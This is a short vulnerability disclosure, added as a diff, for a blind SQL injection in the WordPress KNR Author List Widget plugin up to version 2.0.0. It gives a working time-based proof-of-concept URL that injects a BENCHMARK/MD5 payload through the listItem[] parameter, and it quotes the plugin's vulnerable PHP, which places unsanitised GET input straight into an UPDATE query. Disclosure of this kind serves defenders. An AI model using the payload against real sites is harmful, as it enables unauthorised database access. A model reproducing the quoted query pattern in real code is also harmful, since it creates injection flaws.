@@ -1,0 +1,18 @@
+# Exploit Title: WordPress KNR Author List Widget plugin <= 2.0.0 SQL Injection Vulnerability
+# Date: 2011-09-06
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/knr-author-list-widget.zip
+# Version: 2.0.0 (tested)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+
+---------------
+Vulnerable code
+---------------
+foreach ($_GET['listItem'] as $position => $item) :
+    $iterSql = "UPDATE $wpdb->users SET knr_author_order = $position WHERE ID = $item";
+    $wpdb->query($iterSql);
+endforeach;
